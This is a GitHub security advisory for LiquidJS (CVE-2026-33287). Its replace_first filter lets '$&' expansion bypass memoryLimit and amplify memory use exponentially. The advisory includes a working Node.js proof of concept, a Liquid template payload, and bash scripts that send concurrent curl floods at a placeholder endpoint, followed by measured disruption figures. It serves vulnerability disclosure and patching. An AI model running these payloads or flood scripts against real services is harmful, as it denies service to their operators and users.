# [H] LiquidJS has Exponential Memory Amplification through its replace_first Filter $& Pattern

## Summary
Severity: High
Advisory: GHSA-6q5m-63h6-5x4v
CVE: CVE-2026-33287
CWE: CWE-20, CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-6q5m-63h6-5x4v
Type: github-advisory

## Affected
- npm: `liquidjs` — affected >=0

## Details
### Summary
The `replace_first` filter in LiquidJS uses JavaScript's `String.prototype.replace()` which interprets `$&` as a backreference to the matched substring. The filter only charges `memoryLimit` for the input string length, not the amplified output. An attacker can achieve exponential memory amplification (up to 625,000:1) while staying within the `memoryLimit` budget, leading to denial of service.

### Details
The `replace_first` filter in `src/builtin/filters/string.ts:130-133` delegates to JavaScript's native `String.prototype.replace()`. This native method interprets special replacement patterns including `$&` (insert the matched substring), `$'` (insert the portion after the match), and `` $` `` (insert the portion before the match).

The filter calls `memoryLimit.use(str.length)` to account for the **input** string's memory cost, but the **output** string — potentially many times larger due to `$&` expansion — is never charged against the memory limit.

An attacker can build a 1MB string (within `memoryLimit` budget), then use `replace_first` with a replacement string containing 50 repetitions of `$&`. Each `$&` expands to the full matched string (1MB), producing a 50MB output that is not charged to the memory counter.

By chaining this technique across multiple variable assignments, exponential amplification is achieved:

| Stage | Input Size | `$&` Repetitions | Output Size | Cumulative `memoryLimit` Charge |
|-------|-----------|-------------------|-------------|-------------------------------|
| 1 | 1 byte | 50 | 50 bytes | ~1 byte |
| 2 | 50 bytes | 50 | 2,500 bytes | ~51 bytes |
| 3 | 2,500 bytes | 50 | 125 KB | ~2.6 KB |
| 4 | 125 KB | 50 | 6.25 MB | ~128 KB |
| 5 | 6.25 MB | 50 | 312.5 MB | ~6.38 MB |

**Total amplification factor: ~625,000:1** (312.5 MB output vs. ~6.38 MB charged to `memoryLimit`).

Notably, the sibling `replace` filter uses `str.split(pattern).join(replacement)`, which treats `$&` as a literal string and is therefore not vulnerable. The `replace_last` filter uses manual substring operations and is also safe. Only `replace_first` is affected.

```typescript
// src/builtin/filters/string.ts:130-133 — VULNERABLE
export function replace_first (v: string, arg1: string, arg2: string) {
  const str = stringify(v)
  this.context.memoryLimit.use(str.length)  // Only charges input
  return str.replace(stringify(arg1), arg2)  // $& expansion uncharged!
}

// src/builtin/filters/string.ts:125-129 — SAFE (for comparison)
export function replace (v: string, arg1: string, arg2: string) {
  const str = stringify(v)
  this.context.memoryLimit.use(str.length)
  return str.split(stringify(arg1)).join(arg2)  // split/join: $& treated as literal
}
```

### PoC
**Prerequisites**:
- `npm install liquidjs@10.24.0`
- An application that renders user-provided Liquid templates (CMS, newsletter editor, SaaS platform, etc.)

Save the following as `poc_replace_first_amplification.js` and run with `node poc_replace_first_amplification.js`:

```javascript
const { Liquid } = require('liquidjs');

(async () => {
  const engine = new Liquid({ memoryLimit: 1e8 }); // 100MB limit

  // Step 1 — Verify $& expansion in replace_first
  console.log('=== Step 1: $& expansion in replace_first ===');
  const step1 = '{{ "HELLO" | replace_first: "HELLO", "$&-$&-$&" }}';
  console.log('Result:', await engine.parseAndRender(step1));
  // Output: "HELLO-HELLO-HELLO" — $& expanded to matched string

  // Step 2 — Verify replace (split/join) is safe
  console.log('\n=== Step 2: replace is safe ===');
  const step2 = '{{ "ABCDE" | replace: "ABCDE", "$&$&$&" }}';
  console.log('Result:', await engine.parseAndRender(step2));
  // Output: "$&$&$&" — $& treated as literal

  // Step 3 — 5-stage exponential amplification (50x per stage)
  console.log('\n=== Step 3: Exponential amplification (625,000:1) ===');
  const amp50 = '$&'.repeat(50);
  const step3 = [
    '{% assign s = "A" %}',
    '{% assign s = s | replace_first: s, "' + amp50 + '" %}',
    '{% assign s = s | replace_first: s, "' + amp50 + '" %}',
    '{% assign s = s | replace_first: s, "' + amp50 + '" %}',
    '{% assign s = s | replace_first: s, "' + amp50 + '" %}',
    '{% assign s = s | replace_first: s, "' + amp50 + '" %}',
    '{{ s | size }}'
  ].join('');

  const startMem = process.memoryUsage().heapUsed;
  const result = await engine.parseAndRender(step3);
  const endMem = process.memoryUsage().heapUsed;

  console.log('Output string size:', result.trim(), 'bytes');  // "312500000"
  console.log('Heap increase:', ((endMem - startMem) / 1e6).toFixed(1), 'MB');
  console.log('Amplification: ~625,000:1 (1 byte input -> 312.5 MB output)');
  console.log('memoryLimit charged: < 7 MB (only input lengths counted)');
})();
```

**Expected output:**

```
=== Step 1: $& expansion in replace_first ===
Result: HELLO-HELLO-HELLO

=== Step 2: replace is safe ===
Result: $&$&$&

=== Step 3: Exponential amplification (625,000:1) ===
Output string size: 312500000 bytes
Heap increase: ~625.0 MB
Amplification: ~625,000:1 (1 byte input → 312.5 MB output)
memoryLimit charged: < 7 MB (only input lengths counted)
```

The `memoryLimit` of 100MB is completely bypassed — 312.5 MB is allocated while only ~6.38 MB is charged to the memory counter.

#### Demonstrated Denial of Service (concurrent attack)

After confirming the single-request PoC, launch 20 concurrent attacks + legitimate user requests to measure actual service disruption.

**Raw Liquid template payload sent by attacker:**
```liquid
{% assign s = "A" %}
{% assign s = s | replace_first: s, "$&$&$&...(50 times)...$&" %}
{% assign s = s | replace_first: s, "$&$&$&...(50 times)...$&" %}
{% assign s = s | replace_first: s, "$&$&$&...(50 times)...$&" %}
{% assign s = s | replace_first: s, "$&$&$&...(50 times)...$&" %}
{% assign s = s | replace_first: s, "$&$&$&...(50 times)...$&" %}
{{ s }}
```

> `$&` is a JavaScript `String.prototype.replace()` backreference pattern that inserts the entire matched string. Each stage amplifies 50x → 5 stages = 50^5 = 312,500,000 characters (~312.5MB). `{{ s }}` forces the full output into the HTTP response, keeping memory allocated during transfer and blocking the Node.js event loop.

```bash
#!/bin/bash
# DoS demonstration: 20 concurrent attacks + legitimate user latency measurement

DOLLAR='$&'
REP50=$(printf "${DOLLAR}%.0s" {1..50})
PAYLOAD="{% assign s = \"A\" %}{% assign s = s | replace_first: s, \"${REP50}\" %}{% assign s = s | replace_first: s, \"${REP50}\" %}{% assign s = s | replace_first: s, \"${REP50}\" %}{% assign s = s | replace_first: s, \"${REP50}\" %}{% assign s = s | replace_first: s, \"${REP50}\" %}{{ s }}"

echo "=== Advisory 2 DoS: 20 concurrent + normal user ==="

# 20 DoS attack requests (per-request timing)
for i in $(seq 1 20); do
  (
    t1=$(date +%s%3N)
    curl -s -o /dev/null --max-time 120 -X POST "http://<app>/newsletter/preview" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      --data-urlencode "template=$PAYLOAD"
    t2=$(date +%s%3N)
    echo "DoS[$i]: $(( t2 - t1 ))ms"
  ) &
done

# Legitimate user requests at 0s, 3s, 6s
(
  t1=$(date +%s%3N)
  curl -s -o /dev/null --max-time 60 -X POST "http://<app>/newsletter/preview" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "template=<h1>Hello</h1>"
  t2=$(date +%s%3N)
  echo "Normal[0s]: $(( t2 - t1 ))ms"
) &

(
  sleep 3
  t1=$(date +%s%3N)
  curl -s -o /dev/null --max-time 60 -X POST "http://<app>/newsletter/preview" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "template=<h1>Hello</h1>"
  t2=$(date +%s%3N)
  echo "Normal[3s]: $(( t2 - t1 ))ms"
) &

(
  sleep 6
  t1=$(date +%s%3N)
  curl -s -o /dev/null --max-time 60 -X POST "http://<app>/newsletter/preview" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "template=<h1>Hello</h1>"
  t2=$(date +%s%3N)
  echo "Normal[6s]: $(( t2 - t1 ))ms"
) &

wait
echo "=== Done ==="
```

**Empirical results** (Node.js v20.20.1, LiquidJS 10.24.0):
```
Normal[0s]:  13047ms  ← request sent concurrently with attack — 13s delay
Normal[3s]:  10124ms  ← still blocked 3 seconds later — 10s delay
Normal[6s]:   7186ms  ← still blocked 6 seconds later — 7s delay
DoS[1]:      14729ms
DoS[2-20]:   17747ms ~ 25353ms
```

With 20 concurrent requests, legitimate users experience **up to 13-second delays**. Requests sent 6 seconds after the attack began still take 7 seconds, confirming sustained service disruption throughout the ~25-second attack window. Each attack request costs only ~500 bytes.

#### HTTP Reproduction (for applications that accept user templates)

```bash
# $& expansion — should return "HELLO-HELLO-HELLO"
curl -s -X POST http://<app>/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{ \"HELLO\" | replace_first: \"HELLO\", \"$&-$&-$&\" }}"}'

# replace is safe — should return literal "$&$&$&"
curl -s -X POST http://<app>/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{{ \"ABCDE\" | replace: \"ABCDE\", \"$&$&$&\" }}"}'

# 5-stage 50x amplification — produces ~312.5MB response
curl -s -X POST http://<app>/render \
  -H "Content-Type: application/json" \
  -d '{"template": "{% assign s = \"A\" %}{% assign s = s | replace_first: s, \"$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&\" %}{% assign s = s | replace_first: s, \"$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&\" %}{% assign s = s | replace_first: s, \"$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&\" %}{% assign s = s | replace_first: s, \"$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&\" %}{% assign s = s | replace_first: s, \"$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&\" %}{{ s | size }}"}'
```
```bash
# 20 concurrent DoS attack requests
for i in $(seq 1 20); do
  curl -s -o /dev/null --max-time 120 -X POST "http://<app>/render" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode 'template={% assign s = "A" %}{% assign s = s | replace_first: s, "$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&" %}{% assign s = s | replace_first: s, "$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&" %}{% assign s = s | replace_first: s, "$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&" %}{% assign s = s | replace_first: s, "$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&" %}{% assign s = s | replace_first: s, "$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&$&" %}{{ s }}' &
done

# Legitimate user request (concurrent)
curl -w "Normal: %{time_total}s\n" -s -o /dev/null --max-time 60 -X POST "http://<app>/render" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'template=<h1>Hello</h1>' &

wait
```

Replace `http://<app>/render` with the actual template rendering endpoint. The payload is pure Liquid syntax and works regardless of the HTTP framework.

### Impact
- **`memoryLimit` security bypass**: The memory limit is rendered ineffective for templates using `replace_first` with `$&` patterns.
- **Demonstrated Denial of Service**: A single request allocates 312.5 MB (625 MB heap). Concurrent requests cause **complete service unavailability**. Due to Node.js single-threaded architecture, the event loop is blocked and all legitimate user requests are stalled.
- **Measured service disruption** (LiquidJS 10.24.0, Node.js v20, empirically verified):

  | Concurrent Attack Requests | Legitimate User Latency | vs. Baseline | Server Blocked |
  |---------------------------|------------------------|-------------|---------------|
  | 10 | 3.2s | **640x** | ~11s |
  | 20 | **10.9s** | **2,180x** | ~29s |

  With 20 concurrent requests, legitimate user requests are **delayed by 10.9 seconds** and the server becomes **completely unresponsive for 29 seconds**. Requests sent 6 seconds after the attack began still took 8 seconds, confirming sustained service disruption throughout the attack window. The attack cost is ~500 bytes per HTTP request.

## References
- https://github.com/harttle/liquidjs/security/advisories/GHSA-6q5m-63h6-5x4v
- https://nvd.nist.gov/vuln/detail/CVE-2026-33287
- https://github.com/harttle/liquidjs/commit/35d523026345d80458df24c72e653db78b5d061d
- https://github.com/harttle/liquidjs
